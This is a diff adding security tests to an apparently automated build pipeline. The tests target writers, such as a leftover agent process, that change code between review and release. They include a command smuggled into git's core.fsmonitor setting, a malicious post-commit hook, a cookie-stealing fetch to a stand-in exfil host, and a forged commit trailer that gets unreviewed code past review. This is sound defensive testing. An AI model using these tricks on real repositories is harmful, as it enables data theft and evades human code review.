@@ -703,6 +703,85 @@ class ReviewerIsolation(unittest.TestCase):
         self.assertEqual(argv[-3:], ["--git-dir=/g", f"--work-tree={self.root}", "status"])
 
 
+class _ProcsRunner:
+    """The integration/develop runner shape, running real git through wgflib.procs."""
+
+    def run(self, argv, cwd, timeout=None, **_):
+        return procs.run(list(argv), cwd=cwd, timeout=timeout or 60)
+
+
+def _repo_with_main(scratch):
+    root = os.path.join(scratch, "game")
+    os.makedirs(os.path.join(root, "src"))
+    with open(os.path.join(root, "src", "main.ts"), "w") as handle:
+        handle.write("boot();\n")
+    _git(root, "init", "-q")
+    _git(root, "add", "-A")
+    _git(root, "commit", "-qm", "develop: the reviewed build")
+    return root, _git(root, "rev-parse", "HEAD").strip()
+
+
+@unittest.skipUnless(HAS_GIT, "git is not installed")
+class CommitsAfterReview(unittest.TestCase):
+    """Between review (which read commit P) and verify, only the sdk step may change the
+    build. Attacks by a writer in that window - a leftover agent process, say."""
+
+    def setUp(self):
+        self.scratch = tempfile.mkdtemp(prefix="wgf-sec-commit-")
+        self.addCleanup(shutil.rmtree, self.scratch, ignore_errors=True)
+        self.root, self.reviewed = _repo_with_main(self.scratch)
+
+    def test_developer_git_config_runs_no_command_in_the_factory(self):
+        from wgf_develop.repository import GitRepo, Runner
+        marker = os.path.join(self.scratch, "PWNED")
+        _git(self.root, "config", "core.fsmonitor", f"touch {marker}; false")
+        hook = os.path.join(self.root, ".git", "hooks", "post-commit")
+        with open(hook, "w") as handle:
+            handle.write(f"#!/bin/sh\ntouch {marker}\n")
+        os.chmod(hook, 0o755)
+        repo = GitRepo(self.root, Runner(), author={"name": "t", "email": "t@t.invalid"})
+        with open(os.path.join(self.root, "src", "main.ts"), "a") as handle:
+            handle.write("more();\n")
+        self.assertEqual(repo.dirty_paths(), ["src/main.ts"])
+        repo.commit_all("feat: x", "body", "run:develop:1")
+        self.assertFalse(os.path.exists(marker), "the checkout's config ran a command")
+
+    @unittest.expectedFailure
+    def test_OPEN_an_uncommitted_edit_to_an_sdk_owned_file_is_not_folded_into_its_commit(self):
+        # OPEN (Team L, scripts/wgf_sdk/commit.py:prepare): foreign_changes() exempts
+        # INTEGRATION_PATHS, and patch_main() keeps whatever src/main.ts holds, so a hand
+        # edit made after review is committed under Wgf-Sdk-Key and passes the lineage
+        # rule as sdk's own work: unreviewed code reaches release. P1. Proposed: in
+        # prepare(), a dirty integration path is refused (BLOCKED) unless its content is
+        # byte-identical to what this visit's integration regenerates for it (for
+        # src/main.ts: patch_main applied to HEAD's version), or check out those paths from
+        # HEAD before integrating.
+        from wgf_sdk.commit import CommitRefused, SdkGit, prepare
+        with open(os.path.join(self.root, "src", "main.ts"), "a") as handle:
+            handle.write("fetch('https://exfil.invalid/?' + document.cookie);\n")
+        with self.assertRaises(CommitRefused):
+            prepare(SdkGit(self.root, _ProcsRunner()), self.reviewed, True, "run-1")
+
+    @unittest.expectedFailure
+    def test_OPEN_a_commit_forging_the_sdk_trailer_is_not_taken_for_sdks_own(self):
+        # OPEN (Team L, scripts/wgf_sdk/commit.py:own_commits and
+        # scripts/wgf_verification/lineage.py rule 3): a commit is "sdk's" if its message
+        # carries `Wgf-Sdk-Key: <run_id>:...`. The run id is not secret - every developer
+        # command gets it in {key} - so any writer between review and sdk can commit
+        # unreviewed code with that trailer and verify/release accept it. P1. Proposed:
+        # trust a trailer only for the exact key of a visit sdk has already executed
+        # (context.execution > 1 / previous_outputs), and have release compare
+        # sdk-report.sdk_commits with the shas the sdk step reported in its own events,
+        # not with the trailers git shows.
+        from wgf_sdk.commit import CommitRefused, SdkGit, prepare
+        with open(os.path.join(self.root, "src", "evil.ts"), "w") as handle:
+            handle.write("steal();\n")
+        _git(self.root, "add", "-A")
+        _git(self.root, "commit", "-qm", "chore: looks harmless\n\nWgf-Sdk-Key: run-1:sdk:1")
+        with self.assertRaises(CommitRefused):
+            prepare(SdkGit(self.root, _ProcsRunner()), self.reviewed, True, "run-1")
+
+
 class ReviewerLeftovers(unittest.TestCase):
     """A reviewer (any step's child) that leaves a process behind to write after the
     review's second snapshot."""
